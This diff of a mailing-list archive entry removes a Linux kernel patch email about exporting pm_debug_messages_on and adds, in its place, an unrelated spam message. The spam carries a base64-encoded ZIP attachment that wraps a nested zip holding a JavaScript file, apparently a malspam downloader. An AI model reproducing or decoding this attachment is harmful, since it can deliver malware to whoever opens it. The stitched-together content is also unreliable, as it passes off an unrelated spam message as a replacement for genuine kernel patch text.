@@ -1,69 +1,67 @@
-From: Srinivas Pandruvada <srinivas.pandruvada@linux.intel.com>
-Subject: [PATCH v2 1/2] PM / sleep: Export the setting of pm_debug_messages_on
-Date: Tue,  8 Aug 2017 15:41:14 -0700
-Message-ID: <1502232075-23832-2-git-send-email-srinivas.pandruvada@linux.intel.com>
-References: <1502232075-23832-1-git-send-email-srinivas.pandruvada@linux.intel.com>
+From: <h.piontek@mistravel.pl>
+Subject: (unknown)
+Date: Wed, 09 Aug 2017 00:04:31 -0000
+Message-ID: <150223707145.17373.16291251265639115785@udm.net>
+Mime-Version: 1.0
+Content-Type: application/zip; name="113823879477495.zip"
+Content-Transfer-Encoding: base64
 Return-path: <linux-acpi-owner@vger.kernel.org>
-Received: from mga04.intel.com ([192.55.52.120]:7150 "EHLO mga04.intel.com"
-        rhost-flags-OK-OK-OK-OK) by vger.kernel.org with ESMTP
-        id S1752442AbdHHWlT (ORCPT <rfc822;linux-acpi@vger.kernel.org>);
-        Tue, 8 Aug 2017 18:41:19 -0400
-In-Reply-To: <1502232075-23832-1-git-send-email-srinivas.pandruvada@linux.intel.com>
+Received: from a119.sub119.net78.udm.net ([78.85.119.119]:38807 "HELO udm.net"
+        rhost-flags-OK-OK-OK-FAIL) by vger.kernel.org with SMTP
+        id S1751970AbdHIAEg (ORCPT <rfc822;linux-acpi@vger.kernel.org>);
+        Tue, 8 Aug 2017 20:04:36 -0400
+Subject: 
+Content-Disposition: attachment
 Sender: linux-acpi-owner@vger.kernel.org
 List-Id: linux-acpi@vger.kernel.org
-To: rjw@rjwysocki.net, lenb@kernel.org
-Cc: linux-pm@vger.kernel.org, mario.limonciello@dell.com, linux-kernel@vger.kernel.org, linux-acpi@vger.kernel.org, lukas@wunner.de, Srinivas Pandruvada <srinivas.pandruvada@linux.intel.com>
+To: linux-acpi@vger.kernel.org
 
-Added a function to export the value of pm_debug_messages_on, so that
-other parts of the system can use this flag to enable/disable executing
-PM debug code.
-
-Signed-off-by: Srinivas Pandruvada <srinivas.pandruvada@linux.intel.com>
----
- include/linux/suspend.h | 6 ++++++
- kernel/power/main.c     | 5 +++++
- 2 files changed, 11 insertions(+)
-
-diff --git a/include/linux/suspend.h b/include/linux/suspend.h
-index 8c3b0b1..5d4b3a3 100644
---- a/include/linux/suspend.h
-+++ b/include/linux/suspend.h
-@@ -496,6 +496,10 @@ static inline void unlock_system_sleep(void) {}
- #ifdef CONFIG_PM_SLEEP_DEBUG
- extern bool pm_print_times_enabled;
- extern __printf(2, 3) void __pm_pr_dbg(bool defer, const char *fmt, ...);
-+
-+/* Return the value of pm_debug_messages_on */
-+bool pm_debug_messages_enabled(void);
-+
- #else
- #define pm_print_times_enabled	(false)
- 
-@@ -503,6 +507,8 @@ extern __printf(2, 3) void __pm_pr_dbg(bool defer, const char *fmt, ...);
- 
- #define __pm_pr_dbg(defer, fmt, ...) \
- 	no_printk(KERN_DEBUG fmt, ##__VA_ARGS__)
-+
-+static inline bool pm_debug_messages_enabled(void) { return false; }
- #endif
- 
- #define pm_pr_dbg(fmt, ...) \
-diff --git a/kernel/power/main.c b/kernel/power/main.c
-index 3074ea4..afb7f00 100644
---- a/kernel/power/main.c
-+++ b/kernel/power/main.c
-@@ -363,6 +363,11 @@ power_attr_ro(pm_wakeup_irq);
- 
- static bool pm_debug_messages_on __read_mostly;
- 
-+bool pm_debug_messages_enabled(void)
-+{
-+	return pm_debug_messages_on;
-+}
-+
- static ssize_t pm_debug_messages_show(struct kobject *kobj,
- 				      struct kobj_attribute *attr, char *buf)
- {
--- 
-2.7.5
-
+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
